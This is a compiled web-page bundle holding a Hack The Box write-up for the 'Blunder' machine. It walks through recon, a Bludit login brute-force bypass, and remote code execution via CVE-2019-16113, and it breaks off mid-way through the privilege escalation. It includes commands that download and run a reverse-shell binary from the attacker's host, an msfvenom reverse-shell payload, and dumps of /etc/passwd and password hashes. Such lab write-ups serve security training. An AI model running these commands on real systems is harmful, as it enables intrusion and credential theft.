"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[4976],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>m});var a=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=a.createContext({}),p=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},u=function(e){var n=p(e.components);return a.createElement(l.Provider,{value:n},e.children)},d="mdxType",c={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},h=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),d=p(t),h=r,m=d["".concat(l,".").concat(h)]||d[h]||c[h]||o;return t?a.createElement(m,i(i({ref:n},u),{},{components:t})):a.createElement(m,i({ref:n},u))}));function m(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var o=t.length,i=new Array(o);i[0]=h;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s[d]="string"==typeof e?e:r,i[1]=s;for(var p=2;p<o;p++)i[p]=t[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,t)}h.displayName="MDXCreateElement"},11622:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>c,frontMatter:()=>o,metadata:()=>s,toc:()=>p});var a=t(87462),r=(t(67294),t(3905));const o={layout:"post",title:"Blunder ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","git","msf","php","ruby"],date:"2020/10/17 17:01:00",thumbnail:"/img/HackTheBox/blunder.png",toc:!0},i="Information",s={unversionedId:"HackTheBox/Blunder/write-up",id:"HackTheBox/Blunder/write-up",title:"Blunder ",description:"- Name: Blunder",source:"@site/writeups/HackTheBox/Blunder/write-up.md",sourceDirName:"HackTheBox/Blunder",slug:"/HackTheBox/Blunder/write-up",permalink:"/writeups/HackTheBox/Blunder/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"git",permalink:"/writeups/tags/git"},{label:"msf",permalink:"/writeups/tags/msf"},{label:"php",permalink:"/writeups/tags/php"},{label:"ruby",permalink:"/writeups/tags/ruby"}],version:"current",frontMatter:{layout:"post",title:"Blunder ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","git","msf","php","ruby"],date:"2020/10/17 17:01:00",thumbnail:"/img/HackTheBox/blunder.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Blackfield ",permalink:"/writeups/HackTheBox/Blackfield/write-up"},next:{title:"Book ",permalink:"/writeups/HackTheBox/Book/write-up"}},l={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"HTTP enumeration &amp; exploitation",id:"http-enumeration--exploitation",level:2},{value:"System enumeration",id:"system-enumeration",level:2},{value:"Privilege Escalation of Machine : from www-data to hugo",id:"privilege-escalation-of-machine--from-www-data-to-hugo",level:2},{value:"Privilege Escalation of Machine : from hugo to root",id:"privilege-escalation-of-machine--from-hugo-to-root",level:2}],u={toc:p},d="wrapper";function c(e){let{components:n,...o}=e;return(0,r.kt)(d,(0,a.Z)({},u,o,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"information"},"Information"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Blunder"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/254"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Blunder",src:t(87802).Z,width:"598",height:"381"})),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pacman -S nmap ffuf exploitdb cewl metasploit ruby-httpclient ruby-docopt pwncat haiti\n")),(0,r.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("p",null,"A ",(0,r.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," scan for port and service discovery:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Fri Jun 12 13:20:17 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.191\nNmap scan report for 10.10.10.191\nHost is up (0.11s latency).\nNot shown: 65533 filtered ports\nPORT   STATE  SERVICE VERSION\n21/tcp closed ftp\n80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-generator: Blunder\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Blunder | A blunder of interesting facts\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Fri Jun 12 14:23:47 2020 -- 1 IP address (1 host up) scanned in 3809.57 seconds\n")),(0,r.kt)("p",null,"Let's add the local domain to ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/hosts"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat /etc/hosts| grep bundler\n10.10.10.191 bundler.htb\n")),(0,r.kt)("h2",{id:"http-enumeration--exploitation"},"HTTP enumeration & exploitation"),(0,r.kt)("p",null,"Let's start to enumerate pages on the web server with ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/ffuf/ffuf"},"ffuf"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ffuf -u http://bundler.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php -fc 403\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://bundler.htb/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\n :: Extensions       : .txt .html .php\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Response status: 403\n________________________________________________\n\nadmin                   [Status: 200, Size: 2385, Words: 106, Lines: 71]\ninstall.php             [Status: 200, Size: 30, Words: 5, Lines: 1]\nabout                   [Status: 200, Size: 3280, Words: 225, Lines: 106]\n0                       [Status: 200, Size: 7561, Words: 794, Lines: 171]\nrobots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]\ntodo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]\nrev.php                 [Status: 200, Size: 0, Words: 1, Lines: 1]\nusb                     [Status: 200, Size: 3959, Words: 304, Lines: 111]\n.gitignore              [Status: 200, Size: 563, Words: 1, Lines: 28]\n:: Progress: [153068/153068] :: Job [1/1] :: 105 req/sec :: Duration: [0:24:07] :: Errors: 0 ::\n")),(0,r.kt)("p",null,"I found the following path and files:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"/install.php"),": ",(0,r.kt)("inlineCode",{parentName:"li"},"Bludit is already installed ;)")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"/admin/"),": login page where ",(0,r.kt)("inlineCode",{parentName:"li"},"Bludit")," is also mentioned"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"/robots.txt"),": nothing much"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"/todo.txt"),": a bunch of hints, see below"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"/.gitignore"),": there is maybe a ",(0,r.kt)("inlineCode",{parentName:"li"},"/.git/")," folder exposed to dump")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"/todo.txt")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"-Update the CMS\n-Turn off FTP - DONE\n-Remove old users - DONE\n-Inform fergus that the new blog needs images - PENDING\n")),(0,r.kt)("p",null,"The website seems to be built with ",(0,r.kt)("a",{parentName:"p",href:"https://www.bludit.com/"},"Bludit CMS"),".\nIf we trust the todo list, it may be up to date, the FTP is off and we\nsaw with the ",(0,r.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," scan that port 21 is closed. Also there must be a user\ncalled fergus that may be the admin."),(0,r.kt)("p",null,"It seems the CMS could be exploitable but we don't know the version we have yet."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ searchsploit Bludit --id\n---------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                    |  EDB-ID\n---------------------------------------------------------------------------------- ---------------------------------\nBludit 3.9.12 - Directory Traversal                                               | 48568\nBludit - Directory Traversal Image File Upload (Metasploit)                       | 47699\nbludit Pages Editor 3.0.0 - Arbitrary File Upload                                 | 46060\n---------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n")),(0,r.kt)("p",null,"No need to try to bruteforce on the authentication because there is a\n",(0,r.kt)("a",{parentName:"p",href:"https://docs.bludit.com/en/security/brute-force-protection"},"brute force protection enabled by default"),"."),(0,r.kt)("p",null,"The current version is 3.13.1, so ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/bludit/bludit/search?q=3.13.1&unscoped_q=3.13.1"},"I looked in the source code on github"),"\nfor this version and tried to see if a file is disclosing it.\nIt seems that some files like ",(0,r.kt)("inlineCode",{parentName:"p"},"bl-plugins/about/metadata.json")," are leaking\nthe version."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/PInw6EQ.png",alt:null})),(0,r.kt)("p",null,"So if we look at ",(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.191/bl-plugins/about/metadata.json"},"http://10.10.10.191/bl-plugins/about/metadata.json")," we obtain\nthe following response:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-json"},'{\n  "author": "Bludit",\n  "email": "",\n  "website": "https://plugins.bludit.com",\n  "version": "3.9.2",\n  "releaseDate": "2019-06-21",\n  "license": "MIT",\n  "compatible": "3.9.2",\n  "notes": ""\n}\n')),(0,r.kt)("p",null,"For example the directory traversal was in 3.9.12 so 3.9.2 must be vulnerable\ntoo."),(0,r.kt)("p",null,"So let's try ",(0,r.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/48568"},"EDB-48568")," now:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ searchsploit -p 48568\n  Exploit: Bludit 3.9.12 - Directory Traversal\n      URL: https://www.exploit-db.com/exploits/48568\n     Path: /usr/share/exploitdb/exploits/php/webapps/48568.py\nFile Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators\n\n$ cp /usr/share/exploitdb/exploits/php/webapps/48568.py .\n\n$ python 48568.py\n\n\n\u2554\u2557 \u252c  \u252c \u252c\u250c\u252c\u2510\u252c\u250c\u252c\u2510  \u2554\u2550\u2557\u2566 \u2566\u2554\u2557\u2554\n\u2560\u2569\u2557\u2502  \u2502 \u2502 \u2502\u2502\u2502 \u2502   \u2560\u2550\u255d\u2551\u2551\u2551\u2551\u2551\u2551\n\u255a\u2550\u255d\u2534\u2500\u2518\u2514\u2500\u2518\u2500\u2534\u2518\u2534 \u2534   \u2569  \u255a\u2569\u255d\u255d\u255a\u255d\n\n CVE-2019-16113 CyberVaca\n\n\nusage: 48568.py [-h] -u URL -user USER -pass PASSWORD -c COMMAND\n48568.py: error: the following arguments are required: -u, -user, -pass, -c\n")),(0,r.kt)("p",null,"But it seems it's an authenticated exploit.\nThe ",(0,r.kt)("a",{parentName:"p",href:"https://www.metasploit.com/"},"MSF")," upload exploit seems to be authenticated too."),(0,r.kt)("p",null,"So I searched on internet and found some articles talking about bruteforce\nprotection bypass:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://rastating.github.io/bludit-brute-force-mitigation-bypass/"},"Bludit Brute Force Mitigation Bypass")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb"},"Bludit CMS Version 3.9.2 Brute Force Protection Bypass"))),(0,r.kt)("p",null,"With ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/digininja/CeWL"},"CeWL")," let's build a wordlist based on the words from the website:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cewl -w blunder_wordlist.txt -m 5 http://10.10.10.191\n")),(0,r.kt)("p",null,"Then we can try to find ",(0,r.kt)("inlineCode",{parentName:"p"},"fergus")," password via bruteforce. I made an exploit\nfor the Brute Force Mitigation Bypass:\n",(0,r.kt)("a",{parentName:"p",href:"https://github.com/cyfun/Bludit-auth-BF-bypass"},"Bludit-auth-BF-bypass"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ./exploit.rb -r http://10.10.10.191 -u fergus -w blunder_wordlist.txt\n[*] Trying password: Plugins\n[*] Trying password: Include\n[*] Trying password: About\n[*] Trying password: Begin\n[*] Trying password: service\n[*] Trying password: Stadia\n[*] Trying password: Dynamic\n[*] Trying password: blunder\n[*] Trying password: interesting\n[*] Trying password: facts\n[*] Trying password: devices\n[*] Trying password: Google\n...\n[*] Trying password: RolandDeschain\n\n[+] Password found: RolandDeschain\n")),(0,r.kt)("p",null,"Now we can log in and will probably be able to use one of the authenticated\nexploit."),(0,r.kt)("p",null,"Let's try the ",(0,r.kt)("a",{parentName:"p",href:"https://www.metasploit.com/"},"msf")," one:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"msf5 exploit(linux/http/bludit_upload_images_exec) > options\n\nModule options (exploit/linux/http/bludit_upload_images_exec):\n\n   Name        Current Setting  Required  Description\n   ----        ---------------  --------  -----------\n   BLUDITPASS  RolandDeschain   yes       The password for Bludit\n   BLUDITUSER  fergus           yes       The username for Bludit\n   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT       80               yes       The target port (TCP)\n   SSL         false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI   /                yes       The base path for Bludit\n   VHOST                        no        HTTP server virtual host\n\n\nPayload options (php/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.1.98     yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Bludit v3.9.2\n\nmsf5 exploit(linux/http/bludit_upload_images_exec) > run\n\n[*] Started reverse TCP handler on 192.168.1.98:4444\n[+] Logged in as: fergus\n[*] Retrieving UUID...\n[*] Uploading ScDPUYvvNY.png...\n[*] Uploading .htaccess...\n[*] Executing ScDPUYvvNY.png...\n[!] This exploit may require manual cleanup of '.htaccess' on the target\n[*] Exploit completed, but no session was created.\n")),(0,r.kt)("p",null,"But remember we can try the Python PoC, that won't drop a shell directly but\nwe should be able to execute a command:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ python 48568.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'wget http://10.10.14.82:8888'\n\n\n\u2554\u2557 \u252c  \u252c \u252c\u250c\u252c\u2510\u252c\u250c\u252c\u2510  \u2554\u2550\u2557\u2566 \u2566\u2554\u2557\u2554\n\u2560\u2569\u2557\u2502  \u2502 \u2502 \u2502\u2502\u2502 \u2502   \u2560\u2550\u255d\u2551\u2551\u2551\u2551\u2551\u2551\n\u255a\u2550\u255d\u2534\u2500\u2518\u2514\u2500\u2518\u2500\u2534\u2518\u2534 \u2534   \u2569  \u255a\u2569\u255d\u255d\u255a\u255d\n\n CVE-2019-16113 CyberVaca\n\n\n[+] csrf_token: c70c85766c4e397c88528a05f2096ec4b155ccb7\n[+] cookie: dvn3jo5f1srsl0in6snh59k346\n[+] csrf_token: 1c97c7eab1fadc24b5ac09a593e150c794a19eb7\n[+] Uploading oytpsybc.jpg\n[+] Executing command: wget http://10.10.14.82:8888\n[+] Delete: .htaccess\n[+] Delete: oytpsybc.jpg\n")),(0,r.kt)("p",null,"We can see the connection on our oneline web server:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ ruby -run -e httpd . -p 8888\n[2020-08-16 20:54:16] INFO  WEBrick 1.6.0\n[2020-08-16 20:54:16] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]\n[2020-08-16 20:54:16] INFO  WEBrick::HTTPServer#start: pid=71953 port=8888\n10.10.10.191 - - [16/Aug/2020:20:54:53 CEST] "GET / HTTP/1.1" 200 2265\n- -> /\n')),(0,r.kt)("p",null,"So we can generate a reverse shell with ",(0,r.kt)("inlineCode",{parentName:"p"},"msfvenom")," (part of ",(0,r.kt)("a",{parentName:"p",href:"https://www.metasploit.com/"},"msf"),"):"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=10.10.14.82 LPORT=9999 -f elf > revshell.elf\nNo encoder specified, outputting raw payload\nPayload size: 74 bytes\nFinal size of elf file: 194 bytes\n")),(0,r.kt)("p",null,"Start a listener with ",(0,r.kt)("a",{parentName:"p",href:"https://pwncat.org/"},"pwncat"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pwncat -l 9999 -vv\nINFO: Listening on :::9999 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)\n")),(0,r.kt)("p",null,"Upload & execute our reverse shell:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ python 48568.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'wget http://10.10.14.82:8888/revshell.elf && chmod +x revshell.elf && ./revshell.elf'\n\n\n\u2554\u2557 \u252c  \u252c \u252c\u250c\u252c\u2510\u252c\u250c\u252c\u2510  \u2554\u2550\u2557\u2566 \u2566\u2554\u2557\u2554\n\u2560\u2569\u2557\u2502  \u2502 \u2502 \u2502\u2502\u2502 \u2502   \u2560\u2550\u255d\u2551\u2551\u2551\u2551\u2551\u2551\n\u255a\u2550\u255d\u2534\u2500\u2518\u2514\u2500\u2518\u2500\u2534\u2518\u2534 \u2534   \u2569  \u255a\u2569\u255d\u255d\u255a\u255d\n\n CVE-2019-16113 CyberVaca\n\n\n[+] csrf_token: 1f60ba2db4a30cade52205468c95b5f33e408bc3\n[+] cookie: 3a679ict7buj7aqkmff6e132f3\n[+] csrf_token: 6c3f1bf1c0455dfabb3c539367629f6cb21298da\n[+] Uploading ggllqvlr.jpg\n[+] Executing command: wget http://10.10.14.82:8888/revshell.elf && chmod +x revshell.elf && ./revshell.elf\n[+] Delete: .htaccess\n[+] Delete: ggllqvlr.jpg\n")),(0,r.kt)("p",null,"And we obtain a shell:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'INFO: Client connected from 10.10.10.191:53416 (family 2/IPv4, TCP)\n\nwhich python\n/usr/bin/python\n\npython -c \'import pty;pty.spawn("/bin/bash")\'\n\nwww-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ uname -a\nLinux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n\nwww-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cat /etc/os-release\nNAME="Ubuntu"\nVERSION="19.10 (Eoan Ermine)"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 19.10"\nVERSION_ID="19.10"\nHOME_URL="https://www.ubuntu.com/"\nSUPPORT_URL="https://help.ubuntu.com/"\nBUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"\nPRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"\nVERSION_CODENAME=eoan\nUBUNTU_CODENAME=eoan\n\nwww-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n')),(0,r.kt)("p",null,"Note: it's possible ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/bludit/bludit/issues/1081"},"to do it manually")," too."),(0,r.kt)("h2",{id:"system-enumeration"},"System enumeration"),(0,r.kt)("p",null,"Let's see if there are accounts used by humans:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"www-data@blunder:/var/www/bludit-3.9.2$ ls -lhA /home\ntotal 8.0K\ndrwxr-xr-x 16 hugo  hugo  4.0K May 26 09:29 hugo\ndrwxr-xr-x 16 shaun shaun 4.0K Apr 28 12:13 shaun\n\nwww-data@blunder:/var/www/bludit-3.9.2$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:106:113::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:107:114::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:108:115:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin\nusbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nrtkit:x:110:116:RealtimeKit,,,:/proc:/usr/sbin/nologin\ndnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\ncups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\nspeech-dispatcher:x:113:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false\nkernoops:x:114:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin\navahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\nsaned:x:116:122::/var/lib/saned:/usr/sbin/nologin\nnm-openvpn:x:117:123:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin\nwhoopsie:x:118:124::/nonexistent:/bin/false\ncolord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\nhplip:x:120:7:HPLIP system user,,,:/var/run/hplip:/bin/false\ngeoclue:x:121:126::/var/lib/geoclue:/usr/sbin/nologin\npulse:x:122:127:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\ngnome-initial-setup:x:123:65534::/run/gnome-initial-setup/:/bin/false\ngdm:x:124:129:Gnome Display Manager:/var/lib/gdm3:/bin/false\nshaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash\ntemp:x:1002:1002:,,,:/home/temp:/bin/bash\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"user.txt")," is in hugo's home folder and shuan maybe be used for pe."),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-www-data-to-hugo"},"Privilege Escalation of Machine : from www-data to hugo"),(0,r.kt)("p",null,"Let's see in the database of the app:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},'$ www-data@blunder:/var/www/bludit-3.9.2$ cat bl-content/databases/users.php\n<?php defined(\'BLUDIT\') or die(\'Bludit CMS.\'); ?>\n{\n    "admin": {\n        "nickname": "Admin",\n        "firstName": "Administrator",\n        "lastName": "",\n        "role": "admin",\n        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",\n        "salt": "5dde2887e7aca",\n        "email": "",\n        "registered": "2019-11-27 07:40:55",\n        "tokenRemember": "",\n        "tokenAuth": "b380cb62057e9da47afce66b4615107d",\n        "tokenAuthTTL": "2009-03-15 14:00",\n        "twitter": "",\n        "facebook": "",\n        "instagram": "",\n        "codepen": "",\n        "linkedin": "",\n        "github": "",\n        "gitlab": ""\n    },\n    "fergus": {\n        "firstName": "",\n        "lastName": "",\n        "nickname": "",\n        "description": "",\n        "role": "author",\n        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",\n        "salt": "jqxpjfnv",\n        "email": "",\n        "registered": "2019-11-27 13:26:44",\n        "tokenRemember": "",\n        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",\n        "tokenAuthTTL": "2009-03-15 14:00",\n        "twitter": "",\n        "facebook": "",\n        "codepen": "",\n        "instagram": "",\n        "github": "",\n        "gitlab": "",\n        "linkedin": "",\n        "mastodon": ""\n    }\n')),(0,r.kt)("p",null,"The password seems to be stored as a salted SHA1 hash, we can tell with\n:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ haiti bfcc887f62e36ea019e3295aafb8a3885966e265\nSHA-1 [HC: 100] [JtR: raw-sha1]\nDouble SHA-1 [HC: 4500]\nRIPEMD-160 [HC: 6000] [JtR: ripemd-160]\nHaval-160\nTiger-160\nHAS-160\nLinkedIn [HC: 190] [JtR: raw-sha1-linkedin]\nSkein-256(160)\nSkein-512(160)\n")),(0,r.kt)("p",null,"Those two users won't help us because admin doesn't have a system account &\nwe already have fergus that doesn't have a system account too."),(0,r.kt)("p",null,"But look, there is another bludit version:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"www-data@blunder:/var/www$ ls\nbludit-3.10.0a  bludit-3.9.2  html\n")),(0,r.kt)("p",null,"In the other version the user database contains hugo, a user that is on the\nsystem, so we have soem chance the account re-use the same password."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},'www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php\n<?php defined(\'BLUDIT\') or die(\'Bludit CMS.\'); ?>\n{\n    "admin": {\n        "nickname": "Hugo",\n        "firstName": "Hugo",\n        